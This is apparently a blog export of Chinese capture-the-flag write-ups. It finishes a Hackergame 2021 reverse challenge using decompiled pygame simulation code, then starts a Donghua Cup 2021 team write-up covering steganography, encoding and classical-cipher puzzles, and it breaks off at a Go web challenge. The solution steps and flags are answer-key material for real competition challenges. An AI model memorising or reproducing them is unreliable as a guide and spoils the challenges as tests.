折腾了好一阵子都没搞定，甚至开始研究起这是啥运动，觉得还是不对劲啊。 最后换了个反编译的工具，用了 python-decompile3 这个，对比一下。 decompyle3 2.pyc &gt; 22.py 难怪，uncompyle6 把这个循环位置搞错了啊……（绝绝子 源码如下。 # decompyle3 version 3.7.6 # Python bytecode 3.8.0 (3413) # Decompiled from: Python 3.7.3 (default, Mar 27 2019, 17:13:21) [MSC v.1915 64 bit (AMD64)] # Embedded file name: 2.py # Compiled at: 1995-09-28 00:18:56 # Size of source mod 2**32: 272 bytes import time, pygame, random, math WIDTH = 800 HEIGHT = 480 FPS = 30 RADIUS = 6 WHITE = (255, 255, 255) BLACK = (0, 0, 0) RED = (255, 0, 0) GREEN = (0, 255, 0) BLUE = (0, 0, 255) pygame.init() pygame.mixer.init() screen = pygame.display.set_mode((WIDTH, HEIGHT)) pygame.display.set_caption('Micro world') clock = pygame.time.Clock() running = True count = 0 list_ = [ (104.57999766036382, 294.30576115498934, 0.1577677901040423, 0.41776948474620357), (97.87091160071468, 284.0771467313936, -0.05370797410649919, -1.5117973702589511), (394.1386262922653, 342.409197651039, 1.257922260374631, -0.6461638773589035), (383.764164219779, 351.02042667556873, 0.20006041825672996, 0.6886413335669115), (180.44019240845162, 133.7535956479616, -1.2484762435639396, -0.24929662016190135), (184.78982911642964, 145.40211792122318, -0.0022636999589985274, 0.5513600856872762), (115.03335937165885, 300.9993063319222, -0.5676054221924623, -0.6695938101055833), (428.3301722808014, 85.83680504269783, -0.0513590947698387, 0.2619177140188991), (421.5916683285764, 72.17809124687787, 0.2014421765254144, -1.4100046681437837), (162.58901945971377, 126.99241616764206, 0.030293407742100736, -0.8004786559033131), (160.9895035322225, 145.70895141366148, 0.34929641702611086, 1.0244323100199488), (99.54962866775641, 349.46917135540673, 0.8725254958889044, 0.18026779894381553), (113.4935960089335, 350.07171367926867, 1.3948726673436584, -0.054645034381742424), (243.53937023444496, 324.4815163708293, 0.7754113027163299, -0.35104389069767705), (236.07107039080046, 336.93661006373446, 0.48878994205902065, 0.3668410462786823), (142.25100857351947, 107.18317281548164, 0.8769918696942771, 0.3381787797086514), (126.65532126550701, 101.44841747837386, -0.23643662821636835, -0.7474233162903591), (93.89796091125481, 337.69531331910224, 1.0011924240124088, 0.3786722871573705), (80.48068970171919, 325.1970583485235, -0.7399280117105376, -0.1701776000030069), (562.4548633698985, 293.8157173337281, 0.9232890949122534, -0.6707164772798287), (544.2230504332125, 298.5096170399827, -0.45781767619323493, 0.20143165105280758), (591.0728484545633, 384.0271820277358, -0.3546100658269741, -0.11818203300203947), (587.8300731972232, 397.21466538385005, 0.1658293862635661, 0.42343564083856233), (160.96290809954047, 113.1243147430774, 0.3297720052539864, -0.9088842057483848), (341.609111706211, 174.90102865131772, -0.6451128281395191, 0.6625764312805231), (361.89732768708996, 171.7398998209568, 0.9626383465113062, -0.45377732846689295), (413.2372099784884, 109.2059457838029, 0.06068110806079574, 0.7460129288950222), (428.03790114833487, 103.0981885607253, 0.7102816563423606, 0.5965135218875973), (632.823035103914, 183.41308729879773, 0.9426699419434019, -0.17948947163331008), (619.693443152725, 171.6281942118759, -0.4050225991049363, -0.3004630650084027), (234.93804029190275, 314.4850986917503, 0.6079647151190387, -0.3527147434952942), (388.84210326921414, 329.1140520966929, -0.25641606835531666, 0.013640064895390436), (431.54831561818656, 328.2835752571257, 0.0862740779218544, 0.30203328636401916), (449.4737324005318, 318.59090969779714, 0.8493162548457772, -0.39087008306977955), (414.9662287493531, 321.7992369591167, -0.38427287382474645, -0.8225562013945713), (393.14019608044197, 166.3219823104028, -0.8606903726780473, 0.44501048112586244), (407.74279750683405, 174.07932270043037, -0.41221110195676625, 0.5621672919603494), (459.79766287684146, 367.8798142900581, -0.013886373621122439, -0.3180180360181074), (481.3079661009345, 389.2929845754805, 1.308536261884114, 0.6279064260682542), (299.0319011022105, 142.56295134440845, 0.5129247847316193, 0.6861624164039957), (284.8757848267405, 115.44737423970206, -0.39395187391162256, -0.7247085199267874), (721.0242237005709, 208.11018311759165, 0.5031252275481168, 0.45273074175310746), (698.5559327045538, 206.46532762419102, -0.4253037092008059, -0.10234863067289382), (238.01728536837834, 96.94484935393817, -1.0004911938691854, -0.649305316642717), (231.42367571047265, 113.24222441346936, -1.0247825937879875, -0.17624171000468863), (219.78600179605175, 374.1104577170864, -0.6368728728325652, -0.17569384553335526), (246.11065722883504, 371.79606791842366, 0.5219343181987446, -0.3462866864847798), (61.288999430029705, 325.3049764118085, 0.06327048049117068, 0.43129466994014554), (44.508614390256625, 300.0898728637909, -0.6949149408422702, -0.6606674558084397), (444.7436476698611, 97.43495673585237, 0.0767541318435591, -0.2776251496223229), (744.2355976846196, 142.86962390689527, 0.9981335574540283, -0.24606523573449057), (722.4382189578434, 148.50423479439266, 0.17497076263720399, -0.184532590143744), (418.5327228664219, 136.72695351434712, 0.5475576395865829, -0.8913163462276698), (695.9021288583592, 180.5828160193858, -0.9488479900701872, -0.7148885273332122), (514.3530295181225, 176.69505705865964, 0.4250410294309581, 0.24872469962151272), (491.3217475016306, 192.06501755019133, -0.5852344731438237, 0.6683151007063167), (404.93366351040646, 355.33847789785887, -0.2208752264067056, 0.5785115096521176), (660.6042829909404, 388.98594646068375, -0.2802404219269444, -0.8854758825918975), (657.1412902684084, 422.0142602600062, -0.09955316106014461, 0.6262242796545058), (324.601539532362, 71.99880574130555, -0.44523640628825367, -0.7982939572849916), (313.7688791782026, 100.51158011600064, -0.8550429986673138, 0.23687636012864005), (463.05020279897207, 354.3841115016863, 0.5259364738387711, -0.030002820893658896), (307.8633146779248, 151.5952286725273, 0.6622908641009807, -0.03664136082024409), (398.41892028466214, 111.78772135693538, 0.11954324115479029, -0.8254277998217231), (381.45123257781245, 136.6036806395423, -0.6799079499520264, -0.08600175586428575), (292.6839863142225, 92.60685790044825, 0.536452531252875, -0.7140993636579337), (107.00966574475697, 373.9070654764243, -0.7010200558637464, -0.1381120246392485), (145.16889322345122, 365.860466913724, 0.5965222398714648, -0.5001275164663491), (353.3938458530145, 92.28564527857638, 0.27648661676701847, 0.4055937158607218), (332.6003342739462, 150.35292606144606, 0.16791054337808475, 0.19838069473157122), (333.2155442174266, 135.41367942003444, -0.1948746996045789, -0.8713050639597644), (341.7828985904844, 176.40085292375244, 0.15777998878645658, 0.45702848410002833), (352.9649338991208, 63.40320810353417, 0.31005939791813875, -0.35531540613337653), (558.759849975508, 335.82850463010334, -0.3751838713627865, 0.6972047893312435), (658.9879897953409, 243.4647341215956, -0.2407221233734072, -0.9276449712809698), (680.2245351443412, 296.75251078114536, 0.4337786026208906, 0.9727281158269319), (341.72634396514303, 378.7867598373575, -0.03596521226118493, 0.51167641447653), (697.0597317905844, 409.2588838533252, 0.9048830590914927, -0.4657488561253242), (665.1731546911783, 437.3925803649936, -0.007368744952089001, 0.3787660493964195), (67.00785464657952, 103.1274278061125, 0.03732794987331456, -0.5508360071810254), (105.96964960562794, 128.97178091353496, 0.8136907261343687, 0.4063622560568454), (105.07041437177854, 61.05750261646497, 0.26186719895475497, -0.5163887919827821), (68.49603305059723, 73.94521027290915, -0.7594061833112205, -0.7798070269292883), (71.34190872889897, 124.87773643827933, -0.4688181952259638, -0.5600838356192892), (64.27757202298889, 159.8496885573903, -0.6934232584078162, -0.042604127504053846), (70.57044794264237, 176.93801328964406, -0.4233167428650957, -0.11340691519836832), (144.63770817171127, 69.41378490162104, -0.08749228993661817, -0.28097092956958947), (137.8210753472867, 150.33804975066357, -0.191812024174572, 0.6051129537282753), (137.26460390655052, 180.16854638211603, -0.21242207753516196, 0.11735356970799926), (165.50112593068218, 175.5434604690403, 0.3148565159511876, -0.3132051678133363), (158.21970276683984, 160.0662466663162, -0.399270267894807, -0.47902790124753714), (162.68670402259963, 93.7322224457243, -0.9745665176814846, -0.9728806501583553), (200.74175804924195, 121.50562533623162, -0.6762311833614205, -0.2034953579173453), (224.47067029408507, 148.9360402550957, 0.46187667755869377, -0.22459110166312768), (249.5998504282539, 128.78709867759278, 0.8740685343797732, -0.6745519008298879), (222.1623163178933, 162.24461613732666, -0.40139569192986624, 0.04609689397505523), (270.1496673364134, 119.26292107574434, 0.44998767912644677, -0.8791510712687354), (251.7055547368385, 167.7628397486525, -0.9368313060430262, 0.6578829536537905), (275.1172494773191, 184.09798794704585, -0.5141759452844961, -0.033407853813111066), (265.9957830031348, 199.51750836889886, -0.25941544432835606, 0.056204013662934704), (282.07956665413514, 164.958740535395, 0.8918358020049804, -0.7422688690594414), (353.4402011639725, 114.78109493306745, 0.7570444875545246, -0.415515002478986), (356.5222794940665, 213.68778310329276, 0.6860103516321112, 0.9143623371590044), (330.49971249176855, 226.5949460000718, -0.6111217595640996, 0.873886888891541), (454.61901786077544, 150.71441166327446, 0.8747784392879676, 0.9153485801212855), (388.60627446909075, 197.93977442346403, -0.23680464929294276, 0.14591757123939741), (423.67540627845943, 205.2755085720821, -0.5305405082052022, 0.8620558730400902), (477.52821141998515, 197.94782386045253, 0.8714152377772004, -0.11304356072398081), (509.7764508897392, 142.38940000013736, -0.3416129300096671, 0.4959037037087939), (517.4542284218678, 157.00198576512298, -0.8720656140048659, 0.7778513246341929), (489.14570184081595, 143.71628106431027, -0.43904807996975315, 0.17467707645594244), (484.36624455679043, 162.18554614981508, -0.3197687201188777, 0.006872079622769922), (538.1915570784884, 186.90845701394394, 0.2663539658698997, 0.9595724819979277), (558.4402698588482, 151.2562488554182, 0.20149147625361707, -0.1756944868363639), (498.8936687068798, 219.16941966684988, -0.522456714559989, 0.747015543216671), (557.5264047150413, 194.47492406099926, 0.686163137594151, -0.13055836811114152), (572.2642293852141, 133.05544915189392, -0.36058409684388026, 0.18723885747756386), (593.233462901164, 148.90845332339745, 0.11975788522826214, -0.04042765468897547), (592.1067952919601, 200.97587238888386, -0.2553038780755985, 0.7398471255142076), (620.8001885800545, 156.51793210692475, -0.5999930155535687, 0.3525160039601669), (630.0497687231773, 138.21403356381515, -0.7018604176601002, 0.3042234653264848), (656.2600646659411, 156.841032404578, -0.9903679753354846, 0.7348530520214087), (711.2887269504378, 97.8513508705996, 0.3810639611272786, -0.8943944122000136), (738.7664844418454, 116.88118100970506, 0.6209809052535715, -0.41180811075166335), (703.8040510631283, 152.5920657076647, 0.511261150486223, -0.5706642330494665), (740.09107559372, 198.6981029696348, 0.5218916886562541, 0.1740038136901716), (657.6864804602145, 215.93482850112167, -0.9745747977698767, 0.034623277819314735), (71.54711083768379, 350.36060634700226, 0.6498929939882905, -0.6162738389999025), (150.9033697831391, 276.73234512286984, 0.9223470290051474, 0.582679448995163), (172.75073798985846, 238.05776406669546, 0.9907680736984741, -0.886749479011274), (166.14454393170783, 261.9146208279891, -0.10575763215896572, -0.04019922859299774), (135.8179319546022, 304.5167891568187, 0.51177525757786, 0.6117329317340197), (109.29600036825342, 324.14080376797784, -0.32237035673135206, -0.47626652711191975), (128.25054047146125, 342.5039087606924, 0.41668668412819376, -0.6480033792336315), (160.9435843133916, 336.7772890102673, 0.22013275234783625, 0.4732329263061923), (159.99063987213424, 357.3713520468878, 0.14780147674570876, -0.8751351093745308), (203.82463986148133, 294.85292265982395, 0.36387555042522823, -0.8943361977843205), (238.77834673828744, 257.8957469467245, 0.69549432364027, -0.966824187158376), (234.71098679446786, 302.43763534262735, 0.6189254368321369, -0.02082832064340412), (199.13592069493149, 350.92258754952445, -0.5134844187062317, -0.2621263870546515), (246.08239218788768, 387.5706266290919, 0.5215700810328909, -0.12701382855216137), (279.81163336690304, 310.1193743783627, -0.5995691345591287, 0.8192360880875091), (312.43826713316605, 326.3110183009928, 0.6088247086357645, -0.02551784070396379), (278.3124563204679, 346.2774946054354, -0.618057173316024, 0.23249980020133165), (309.0606334597058, 364.2832298989901, 0.5578012392483811, 0.34382332959224393), (277.86613144487796, 384.4110746203211, -0.5605136501896855, 0.422632393345197), (297.7963837815137, 417.4215462126431, 0.1776438437597616, 0.978575785653446), (308.64648313310744, 389.32195957645587, -0.8279080321071313, 0.048961465794687076), (332.9030266443413, 352.59935912758954, -0.9665545687281056, 0.614791078799594), (348.26013943242486, 314.11612768512305, -0.842217058058359, -0.032736011662137576), (360.3306887191309, 292.2383422919451, -0.7655300474395692, -0.32450584103905666), (396.9404109804546, 370.8911519658965, -0.15035514887206558, -0.04106844570751811), (400.104874692782, 411.57211198606, -0.1442639002673347, 0.761930073557795), (440.30114216085207, 361.3409051871098, 0.9000423022537898, -0.2836701782551865), (429.3543769941238, 341.9294444418788, 0.3094213701527606, -0.33594650215266264), (447.43603366759595, 277.2285471339229, 0.38651976546653843, -0.880424180225089), (481.7939322275633, 301.5421301772078, -0.15578028786801723, -0.09103221565894848), (496.05798504633856, 291.5141421831062, -0.0719264797652579, -0.09206880803313222), (509.5366997343411, 286.81707674748407, -0.16530741724662823, 0.14137321286975357), (512.6359971378648, 331.33312820778906, -0.7542223282272489, 0.9012269706588789), (565.2777793457861, 322.789250206497, -0.8786007649708629, 0.6588611187591347), (616.2993903993898, 307.1147976370016, 0.30738482960705515, 0.07832583840747809), (549.4707698926467, 355.7327131244734, -0.6862677817538163, 0.5086190046101378), (566.0048628120813, 359.0888370802809, -0.8146347106636107, 0.521808780751152), (603.0173174232779, 355.65724327656727, -0.22158083617492497, 0.09841641765061859), (627.8321653818715, 343.97419893606997, 0.4011913104396747, -0.9268815208862793), (537.4339433151019, 408.0628758894442, -0.9839280253666145, 0.5949213292386479), (640.8558916665046, 286.24303230003744, -0.30163364198134635, 0.3052974925939915), (693.3776564065166, 322.7209553086005, 0.6806539409820418, 0.8785539003185334), (677.9197897159304, 332.5251925812629, 0.1451773968863177, 0.42685898449123116), (715.7380915196851, 359.6720022622894, 0.8791885748031647, 0.9508148986033234), (654.241096201209, 350.8310224121308, -0.8058853258811696, 0.25300083007890595), (660.0062961624873, 367.58093595080226, -0.6293964384264055, 0.09559022040005982), (674.0852620040955, 376.20299215975325, -0.07091622207048798, -0.362852142231338)] class Point: def __init__(self, pos, vx, vy): self.x, self.y = pos self.vx = vx self.vy = vy self.flag = 1 def dotproduct(v1, v2): return v1[0] * v2[0] + v1[1] * v2[1] def checkcrush(point1, point2): distance = math.sqrt((point1.x - point2.x) ** 2 + (point1.y - point2.y) ** 2) a = (point1.vx - point2.vx) ** 2 + (point1.vy - point2.vy) ** 2 b = 2 * (point1.x - point2.x) * (point1.vx - point2.vx) + 2 * (point1.y - point2.y) * (point1.vy - point2.vy) c = distance ** 2 - 4 * RADIUS ** 2 delta = b ** 2 - 4 * a * c if delta &lt; 0: return time = (-b - math.sqrt(delta)) / (2 * a) if time &gt; 0: if time &lt; 1: return time return def get_new_point(time, point1, point2): distance = math.sqrt((point1.x - point2.x) ** 2 + (point1.y - point2.y) ** 2) standard_displacement = ((point2.x - point1.x) / distance, (point2.y - point1.y) / distance) v_1 = (point1.vx, point1.vy) v_2 = (point2.vx, point2.vy) v_par_1 = dotproduct(standard_displacement, v_1) v_par_2 = dotproduct(standard_displacement, v_2) v_ver_1 = (point1.vx - v_par_1 * standard_displacement[0], point1.vy - v_par_1 * standard_displacement[1]) v_ver_2 = (point2.vx - v_par_2 * standard_displacement[0], point2.vy - v_par_2 * standard_displacement[1]) v_after_par_1 = v_par_2 v_after_par_2 = v_par_1 v_after_1 = (v_after_par_1 * standard_displacement[0] + v_ver_1[0], v_after_par_1 * standard_displacement[1] + v_ver_1[1]) v_after_2 = (v_after_par_2 * standard_displacement[0] + v_ver_2[0], v_after_par_2 * standard_displacement[1] + v_ver_2[1]) afterpos_1 = (point1.x + point1.vx * time + v_after_1[0] * (1 - time), point1.y + point1.vy * time + v_after_1[1] * (1 - time)) afterpos_2 = (point2.x + point2.vx * time + v_after_2[0] * (1 - time), point2.y + point2.vy * time + v_after_2[1] * (1 - time)) return ( Point(afterpos_1, v_after_1[0], v_after_1[1]), Point(afterpos_2, v_after_2[0], v_after_2[1])) def drawpoint(screen, list_): for item in list_: pygame.draw.circle(screen, BLUE, (round(item.x), round(item.y)), RADIUS, 3) def next_pos_list(Pointlist): pointlist = [] for i in range(len(Pointlist)): for point in Pointlist[i + 1:]: times = checkcrush(Pointlist[i], point) if times != None: a, b = get_new_point(times, Pointlist[i], point) pointlist.extend([a, b]) Pointlist[i].flag = 0 point.flag = 0 else: for item in Pointlist: if item.flag != 0: pointlist.append(Point((item.x + item.vx, item.y + item.vy), item.vx, item.vy)) else: for poi in pointlist: poi.x = poi.x % WIDTH poi.y = poi.y % HEIGHT else: return pointlist Pointlist = [] for item in list_: Pointlist.append(Point((item[0], item[1]), item[2], item[3])) else: def value(lis): count = 0 for item in lis: count = count + (item.x - round(item.x)) ** 2 + (item.y - round(item.y)) ** 2 else: return count while True: if running: clock.tick(FPS) for event in pygame.event.get(): if event.type == pygame.QUIT: running = False else: screen.fill(BLACK) drawpoint(screen, Pointlist) Pointlist = next_pos_list(Pointlist) pygame.display.flip() pygame.quit() # okay decompiling 2.pyc 那就把速度改成负的，然后倒着运动回去就完事了，也就是初始化点的坐标列表这里。 Pointlist = [] for item in list_: Pointlist.append(Point((item[0], item[1]), -item[2], -item[3])) 跑一下，得到 flag。 flag{Rev3sEtiM^5} 小结啊！今年的 Hackergame 就这么结束啦！ u1s1，今年 题目很有梯度，基础的很能划水，中等的题目能摸摸鱼，有些题目还是挺难的，然而喵喵这周忙于作业、其他比赛、balabala，还有好几题觉得有点思路的没来得及看了。 摸了摸了，咱还是来学习为主，2333 完结 撒花，撒 mcfx！ 感谢所有幕后工作人员，喵喵今年也学到了许多，明年有机会一定再来。 其他资源 官方题解 repo： hackergame2021-writeups （这 wp 写得可良心了！Orz Hackergame 2021 幕后工作人员 花絮 榜一 mcfx 的全部 wp：Hackergame 2021 Writeup 或者 GitHub (mcfx! Orz! GZTime’s writeup: Hackergame 2021 Summary ranwen’s writeup: USTC Hackergame 2021 划水记 或者 GitHub etc. 顺便放几个梗（ （溜了溜了喵~","path":"2021/11/03/CTF_2021Hackergame/"},{"title":"CTF | 2021 东华杯 大学生网络安全邀请赛 WriteUp","text":"本文首发于安全客：https://www.anquanke.com/post/id/258197 引言 “东华杯”2021年大学生网络安全邀请赛暨第七届上海市大学生网络安全大赛 比赛时间: 2021-10-31 09:00 ~ 2021-10-31 21:00 比赛官网: https://www.ichunqiu.com/2021dhb 十月就要结束了，这个比赛就是十月份的最后一个比赛啦~ 这比赛往年相对其他比赛来说都挺简单的，不能跨校组队，于是就拉上校内的学弟随意组了个队来打了。 从早九开始打，然而喵喵中午才起来，摸了.jpg，还好还能做几题，不然就彻底摸鱼了（虽然签个到也能进决赛，逃 这篇是团队的 writeup 啦~ Reverse 题目是队友做的。喵喵也想学 RE，呜呜。 Misccheckin +AGYAbABhAGcAewBkAGgAYgBfADcAdABoAH0- s = b\"+AGYAbABhAGcAewBkAGgAYgBfADcAdABoAH0-\" s.decode('utf-7') # 'flag{dhb_7th}' （一看到这个开头的 + 就想到 2020 USTC Hackergame 那个 utf-7 的题目 了 project 一个普普通通的工程文件 附件下载 提取码（GAME）备用下载 解压出来一堆的远古文件，发现是 组态王（KingView），感觉是工控的题。 再一看修改时间，只有一个今年的 test.exe，一看就是 pyinstaller 打包的，遂解包，发现其实只是释放了一个 problem_bak.zip。 运行 exe 得到这个 zip。里面一个 你来了~ 经典邮件。 6KGo5oOF5YyF5paH5YyW77yM5piv6ZqP552A572R57uc56S+5Lqk5rKf6YCa55qE5aKe5aSa5Ye6 546w55qE5LiA56eN5Li75rWB5paH5YyW44CC5LiA5Liq5Lq655qE6KGo5oOF5YyF5piv5YW26ZqQ 6JeP6LW35p2l55qE55yf5oiR77yM5LiA5Liq5Zu95a6255qE6KGo5oOF5YyF6YeM6IO955yL5Yiw 6L+Z5Liq5Zu95a6255qE6KGo5oOF44CC4oCM4oCM4oCM4oCM4oCN4oCs4oCs4oCM5pyJ5pe25YCZ 77yM6KGo5oOF5YyF6KGo6L6+55qE5piv5LiN6IO96YGT56C055qE55yf5a6e5oOz5rOV5ZKM5oSf 5Y+X77yM6K+t6KiA5ZKM5paH5a2X55qE5bC95aS077yM5bCx5piv6KGo5oOF5YyF5pa95bGV55qE 56m66Ze044CCDQrooajmg4XljIXmmK/nvZHnu5zor63oqIDnmoTkuIDnp43ov5vljJbvvIzlroPn moTkuqfnlJ/lkozmtYHooYzkuI7lhbbnibnlrprnmoTigJzigIzigIzigIzigIzigI3vu7/igI3i gI3nlJ/lrZjnjq/looPigJ3mnInlhbPjgILlhbbov73msYLphpLnm67jgIHmlrDlpYfjgIHosJDo sJHnrYnmlYjmnpznmoTnibnngrnvvIzigIzigIzigIzigIzigI3vu7/igIzigKzkuI7lubTovbvk urrlvKDmiazkuKrmgKflkozmkJ7mgKrnmoTlv4PnkIbnm7jnrKbigIzigIzigIzigIzigI3vu7/i gIzigKzjgIINCuihqOaDheWMheS5i+aJgOS7peiDveWkn+Wkp+iMg+WbtOWcsOS8oOaSre+8jOKA jOKAjOKAjOKAjOKAje+7v+KArOKAjeaYr+WboOS4uuWFtuW8peihpeS6huaWh+Wtl+S6pOa1geea hOaer+eHpeWSjOaAgeW6puihqOi+vuS4jeWHhuehrueahOW8seeCue+8jOacieaViOWcsOaPkOmr mOS6huayn+mAmuaViOeOh+OAgumDqOWIhuihqOaDheWMheWFt+acieabv+S7o+aWh+Wtl+eahOWK n+iDve+8jOKAjOKAjOKAjOKAjOKAje+7v+KAjeKAjei/mOWPr+S7peiKguecgeaJk+Wtl+aXtumX tOKAjOKAjOKAjOKAjOKAje+7v+KAjOKAjOOAgumaj+edgOaZuuiDveaJi+acuueahOWFqOmdouaZ ruWPiuWSjOekvuS6pOW6lOeUqOi9r+S7tueahOWkp+mHj+S9v+eUqO+8jOihqOaDheWMheW3sue7 j+mrmOmikeeOh+WcsOWHuueOsOWcqOS6uuS7rOeahOe9kee7nOiBiuWkqeWvueivneW9k+S4reOA gg0K base64 解码，发现有零宽隐写 表情包文化，是随着网络社交沟通的增多出现的一种主流文化。一个人的表情包是其隐藏起来的真我，一个国家的表情包里能看到这个国家的表情。‌‌‌‌‍‬‬‌有时候，表情包表达的是不能道破的真实想法和感受，语言和文字的尽头，就是表情包施展的空间。 表情包是网络语言的一种进化，它的产生和流行与其特定的“‌‌‌‌‍ ‍‍生存环境”有关。其追求醒目、新奇、谐谑等效果的特点，‌‌‌‌‍ ‌‬与年轻人张扬个性和搞怪的心理相符‌‌‌‌‍ ‌‬。 表情包之所以能够大范围地传播，‌‌‌‌‍ ‬‍是因为其弥补了文字交流的枯燥和态度表达不准确的弱点，有效地提高了沟通效率。部分表情包具有替代文字的功能，‌‌‌‌‍ ‍‍还可以节省打字时间‌‌‌‌‍ ‌‌。随着智能手机的全面普及和社交应用软件的大量使用，表情包已经高频率地出现在人们的网络聊天对话当中。 到 零宽隐写 解密一下，用到的字符 vim 看一下就行。 得到 hurryup，盲猜是某个加密的密码。 再看邮件里还有张图片，base64 解码导出到文件。 OurSecret 解密得到 flag。 flag{f3a5dc36-ad43-d4fa-e75f-ef79e2e28ef3} JumpJumpTiger flag格式为flag{uuid} 附件下载 提取码（GAME）备用下载 是跳跳虎啊（ 给了个 jump.exe，运行就输出一句话 This is your hint!!! 拖进 IDA，发现它这里其实这个 v4 数组也就是前后把奇数位和偶数位分开的操作。 然后看 strings 窗口，发现有一堆看上去像 base64 的字符串，然而解析不出来。 下面两个很明显是隔位来取值，于是比赛的时候就考虑了各种方法把这三个字符串的奇数位和偶数位分开，或者按不同顺序排列奇数位和偶数位。然而不管啥样都解析不出一个看得出来的东西…… 赛后问了下其他师傅，说直接十六进制编辑器复制出来，奇偶位分开就完事了。 ？？？？？？？ 喵喵疑惑脸.jpg 然后拖进 010 editor 一看，草，IDA 解析锅了啊！！！ 也就是说，不知道什么原因，这个 strings window 解析出来的字符串分段了，而且导出来也不完整。 而实际上这一长串字符串都是连在一起的。于是直接在 010 Editor 里整个复制出来。 然后奇偶位分别导出到两个文件。 import base64 with open('base64.dat', 'r', encoding='utf-8') as fin: s = fin.read() s1 = ''.join([s[i] for i in range(0, len(s), 2)]) s2 = ''.join([s[i] for i in range(1, len(s), 2)]) data1 = base64.b64decode(s1) data2 = base64.b64decode(s2) print(data1[:200]) print('======') print(data2[:200]) with open('data1.jpg', 'wb') as f1: f1.write(data1) with open('data2.png', 'wb') as f1: f1.write(data2) # b'\\xff\\xd8\\xff\\xe0\\x00\\x10JFIF\\x00\\x01\\x01\\x01\\x00\\x01\\x00\\x01\\x00\\x00\\xff\\xdb\\x00C\\x00\\x05\\x03\\x04\\x04\\x04\\x03\\x05\\x04\\x04\\x04\\x05\\x05\\x05\\x06\\x07\\x0c\\x08\\x07\\x07\\x07\\x07\\x0f\\x0b\\x0b\\t\\x0c\\x11\\x0f\\x12\\x12\\x11\\x0f\\x11\\x11\\x13\\x16\\x1c\\x17\\x13\\x14\\x1a\\x15\\x11\\x11\\x18!\\x18\\x1a\\x1d\\x1d\\x1f\\x1f\\x1f\\x13\\x17\"$\"\\x1e$\\x1c\\x1e\\x1f\\x1e\\xff\\xdb\\x00C\\x01\\x05\\x05\\x05\\x07\\x06\\x07\\x0e\\x08\\x08\\x0e\\x1e\\x14\\x11\\x14\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\x1e\\xff\\xc0\\x00\\x11\\x08\\x048\\x07\\x80\\x03\\x01\\x11\\x00\\x02\\x11\\x01\\x03\\x11\\x01\\xff\\xc4\\x00\\x1d\\x00\\x00\\x02\\x02\\x03\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x02' # ====== # b'\\x89PNG\\r\\n\\x1a\\n\\x00\\x00\\x00\\rIHDR\\x00\\x00\\x07\\x80\\x00\\x00\\x048\\x08\\x02\\x00\\x00\\x00g\\xb1V\\x14\\x00\\x00 \\x00IDATx\\x01d\\xc1A\\x96,\\xe7\\x96\\x9c\\xd7\\xcf\\xec\\xb8\\'\\x00R\\xf3\\x9f\\x15\\xd5\"G\\xc0Zj\\xabA\\xb2\\xde\\xcd\\xf8\\x8f\\x19#\\x1cH\\xea\\xd6\\xd2\\xde\\xfa\\xef\\xff\\xf5\\xbf\\xf4\\x07\\xd06I\\xdb$\\x92l_\\xd753\\xb6\\x81\\xb6\\xbb\\xcbC\\x12\\xbfI\\x97\\xb7\\nl_b@\\x80\\xfc\\xdd\\xaa\\xad&gt;*\\x93\\x9c$m\\x81\\x8aGT\\x0c*\\xbe\\x06P\\xf9H\\xd5v\\xd3\\xf6\\x17\\xb3\\xbb\\xb6\\xff\\xfc\\xf3\\x0fI\\xaf\\xd7+9\\xb6\\xff\\xb8\\xd5\\xf6\\x9c\\xb3\\xbb\\x92\\xae\\xeb\\x92\\xc4[\\xdd\\x1f\\x92lK\\xb2\\xdd6\\x8f\\xb6#\\xf1\\xc3\\xba$\\xf1\\xe8#I\\xdb\\xfft{\\xe5\\x15\\xc7.\\x06T\\x01G' 得到两张图，一张 jpg 一张 png。 进行一个 diff，SUB 很明显看出就是熟悉的经典盲水印。一张是原图，一张是加了盲水印的 png。 这里用到的是 chishaxie 的 BlindWaterMark。 python bwmforpy3.py decode data1.jpg data2.png out.png 呐，flag。 where_can_find_code 附件下载 提取码（GAME）备用下载 给了个 code.asc，发现这个文件里有一堆的 \\0. 尝试着拿去当 html 解析，效果长这样。 （好像也没啥用） 下面这段长得就很像 flag，应该是某种映射关系。然而直接拿去 quipquip 解的话出来都不对。 format(\"Translate the letter J into I\"); dpeb{e58ca5e2-2c51-4eef-5f5e-33539364deoa} 再回到最开始的 \\0，发现是用了 wbStego 隐写。 password 为空，解密出来得到 20810842042108421 只含有 01248，是那个 云影密码。 实际上就是以 0 作为间隔，其他数隔开后十进制组合相加，转化为 1-26 对应的字母 A-Z. 直接抄个网上的脚本好了。 def de_code(c): dic = [chr(i) for i in range(ord(\"A\"), ord(\"Z\") + 1)] flag = [] c2 = [i for i in c.split(\"0\")] for i in c2: c3 = 0 for j in i: c3 += int(j) flag.append(dic[c3 - 1]) return flag def encode(plaintext): dic = [chr(i) for i in range(ord(\"A\"), ord(\"Z\") + 1)] m = [i for i in plaintext] tmp = [] flag = [] for i in range(len(m)): for j in range(len(dic)): if m[i] == dic[j]: tmp.append(j + 1) for i in tmp: res = \"\" if i &gt;= 8: res += int(i/8)*\"8\" if i % 8 &gt;= 4: res += int(i % 8/4)*\"4\" if i % 4 &gt;= 2: res += int(i % 4/2)*\"2\" if i % 2 &gt;= 1: res += int(i % 2/1)*\"1\" flag.append(res + \"0\") print(\"\".join(flag)[:-1]) c = input(\"输入要解密的数字串:\") print(de_code(c)) # m_code = input(\"请输入要加密的数字串:\") # encode(m_code) 得到 BINGO 再去搜 Translate the letter J into I，发现是 多表代换加密 里的 Playfair cipher。 有一个 在线的 Playfair Cipher 工具 可以直接在网页上编解码。 flag{d58af5d2-2a51-4dde-5e5d-33539364cdbf} WebOldLibrary 附件下载 提取码（GAME）备用下载 是个 golang 的题目。虽然咱不会 golang，但给了源码而不是二进制文件，看起来还是挺舒服的。 首先看各个接口 router.POST(\"/delete\", handler.IPCheckMiddleWare(), DeleteController) router.POST(\"/signin\", LoginController) router.POST(\"/signup\", RegisterController) router.POST(\"/download\", handler.LoginCheckMiddleWare(), DownloadController) router.POST(\"/submit\", 